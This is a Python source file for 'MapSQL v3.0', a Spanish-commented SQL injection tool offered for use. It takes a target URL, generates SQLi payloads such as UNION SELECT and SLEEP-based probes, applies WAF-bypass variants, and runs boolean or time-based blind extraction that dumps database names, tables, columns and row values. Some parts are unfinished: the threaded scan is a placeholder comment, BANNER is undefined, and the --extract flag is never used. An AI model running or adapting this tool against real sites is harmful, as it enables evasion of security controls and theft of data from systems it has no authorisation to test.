#!/usr/bin/env python3
"""
MapSQL v3.0 - WAF Bypass + Blind SQLi Extraction
La herramienta definitiva de SQLi
"""

import argparse
import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import time
from core.multi_thread import AdvancedThreadPool, sqli_worker
from core.ml_detector import MLDetector
from core.waf_bypass import WAFBypassEngine, AdaptiveBypasser
from core.blind_extractor import BlindExtractor, TimeBasedBlindExtractor

# Banner (mantén el que ya tienes)

class MapSQLUltimate:
    def __init__(self, url, threads=20, rate_limit=0, use_ml=True, bypass_waf=True, blind_method='boolean'):
        self.url = url
        self.threads = threads
        self.rate_limit = rate_limit
        self.use_ml = use_ml
        self.bypass_waf = bypass_waf
        self.blind_method = blind_method
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'MapSQL/3.0'})
        
        # Componentes avanzados
        self.waf_engine = WAFBypassEngine() if bypass_waf else None
        self.adaptive_bypasser = AdaptiveBypasser() if bypass_waf else None
        self.ml_detector = MLDetector() if use_ml else None
        self.blind_extractor = None
        
        # Payloads base
        self.base_payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'--",
        ]
        
    def generate_bypassed_payloads(self, original_payloads):
        """Genera payloads con bypass de WAF"""
        if not self.bypass_waf:
            return original_payloads
        
        bypassed = []
        for payload in original_payloads:
            # Generar múltiples variantes
            variants = self.waf_engine.apply_all_bypasses(payload)
            bypassed.extend(variants)
            
            # Versión adaptativa
            adaptive = self.adaptive_bypasser.adaptive_bypass(payload)
            bypassed.append(adaptive)
        
        # Eliminar duplicados y retornar
        return list(set(original_payloads + bypassed))
    
    def detect_and_bypass_waf(self):
        """Detecta WAF y prepara bypasses específicos"""
        print("[*] Detectando WAF...")
        
        try:
            response = self.session.get(self.url, timeout=5)
            waf_name = self.waf_engine.detect_waf(dict(response.headers), response.text)
            
            if waf_name:
                print(f"[!] WAF detectado: {waf_name}")
                print(f"[*] Activando {len(self.waf_engine.bypass_techniques)} técnicas de bypass")
                return True
            else:
                print("[+] No se detectó WAF aparente")
                return False
                
        except Exception as e:
            print(f"[-] Error detectando WAF: {e}")
            return False
    
    def get_parameters(self):
        """Extrae parámetros de la URL"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        return list(params.keys())
    
    def inject_function(self, payload):
        """Función de inyección para Blind Extractor"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        
        if params:
            param = list(params.keys())[0]
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            try:
                start = time.time()
                response = self.session.get(test_url, timeout=10)
                elapsed = time.time() - start
                return response.text, elapsed
            except:
                return "", 0
        
        return "", 0
    
    def run_blind_extraction(self):
        """Ejecuta extracción de datos con Blind SQLi"""
        print("\n[!] Iniciando Blind SQLi Extraction...")
        
        if self.blind_method == 'time':
            self.blind_extractor = TimeBasedBlindExtractor(self.inject_function, delay_seconds=5)
        else:
            self.blind_extractor = BlindExtractor(self.inject_function, method='boolean')
        
        # Extraer información
        db_name = self.blind_extractor.extract_database_name()
        print(f"\n[+] Database: {db_name}")
        
        tables = self.blind_extractor.extract_table_names()
        print(f"\n[+] Tablas encontradas: {len(tables)}")
        
        for table in tables:
            columns = self.blind_extractor.extract_column_names(table)
            print(f"\n[+] Tabla '{table}' tiene {len(columns)} columnas")
            
            for column in columns:
                data = self.blind_extractor.extract_data(table, column, row_limit=5)
                if data:
                    print(f"\n[!] Datos en {table}.{column}:")
                    for row, value in enumerate(data, 1):
                        print(f"    Row {row}: {value}")
    
    def run(self):
        """Ejecuta escaneo completo"""
        print(BANNER)
        print(f"[*] Target: {self.url}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] WAF Bypass: {'Activado' if self.bypass_waf else 'Desactivado'}")
        print(f"[*] Blind Method: {self.blind_method.upper()}")
        print(f"[*] ML Mode: {'Activado' if self.use_ml else 'Desactivado'}\n")
        
        # Detectar WAF
        if self.bypass_waf:
            self.detect_and_bypass_waf()
        
        # Generar payloads con bypass
        payloads = self.generate_bypassed_payloads(self.base_payloads)
        print(f"[*] Generados {len(payloads)} payloads (con bypasses)")
        
        # Escaneo rápido con ML + Multi-threading
        params = self.get_parameters()
        if not params:
            print("[!] No se encontraron parámetros, intentando modo Blind SQLi...")
            self.run_blind_extraction()
            return
        
        # Aquí iría el código de escaneo multi-threading (similar a antes)
        print("[*] Iniciando escaneo multi-threading...")
        
        # Preguntar si quiere extracción blind
        print("\n[?] ¿Deseas iniciar extracción Blind SQLi? (s/n): ", end='')
        choice = input().lower()
        
        if choice == 's':
            self.run_blind_extraction()
        
        print("\n[+] Escaneo completado!")

def main():
    parser = argparse.ArgumentParser(description='MapSQL v3.0 - WAF Bypass + Blind Extraction')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Hilos concurrentes')
    parser.add_argument('--rate-limit', type=float, default=0, help='Segundos entre peticiones')
    parser.add_argument('--no-ml', action='store_true', help='Desactivar ML')
    parser.add_argument('--no-waf-bypass', action='store_true', help='Desactivar WAF bypass')
    parser.add_argument('--blind', choices=['boolean', 'time'], default='boolean', 
                       help='Método de Blind SQLi (boolean/time)')
    parser.add_argument('--extract', action='store_true', help='Extraer datos con Blind SQLi')
    
    args = parser.parse_args()
    
    scanner = MapSQLUltimate(
        url=args.url,
        threads=args.threads,
        rate_limit=args.rate_limit,
        use_ml=not args.no_ml,
        bypass_waf=not args.no_waf_bypass,
        blind_method=args.blind
    )
    
    scanner.run()

if __name__ == "__main__":
    main()
